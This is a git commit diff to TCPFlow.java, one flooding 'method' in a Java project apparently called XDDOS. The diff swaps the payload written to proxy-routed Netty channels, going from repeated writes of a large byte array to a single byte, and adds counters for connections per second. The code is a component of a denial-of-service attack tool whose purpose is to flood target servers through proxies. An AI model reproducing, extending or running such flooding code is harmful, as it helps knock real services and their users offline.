aaa18903ac79ee74d15dd91984815894f00efbf0
LastKnell <yatharthrathi.rathi@gmail.com>
2022-10-05 17:08:21 +0000

    xd

--- src/XD/XDDOS/methods/impl/TCPFlow.java
+++ src/XD/XDDOS/methods/impl/TCPFlow.java
@@ -1,24 +1,17 @@
 package XD.XDDOS.methods.impl;
 
 import XD.XDDOS.methods.IMethod;
+import XD.XDDOS.utils.NettyBootstrap;
 import XD.XDDOS.utils.proxy.ProxyLoader.Proxy;
 import io.netty.channel.Channel;
 
 public class TCPFlow implements IMethod{
     private Byte max = Byte.MAX_VALUE;
-    private Byte[] arr = new Byte[]{max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max};
     @Override
     public void accept(Channel channel, Proxy p) {
-        channel.write(arr);
-        channel.write(arr);
-        channel.write(arr);
-        channel.write(arr);
-        channel.write(arr);
-        channel.write(arr);
-        channel.write(arr);
-        channel.write(arr);
-        channel.write(arr);
-        channel.write(arr);
+        channel.write(max);
+        NettyBootstrap.integer++;
+        NettyBootstrap.triedCPS++;
     }
     
 }
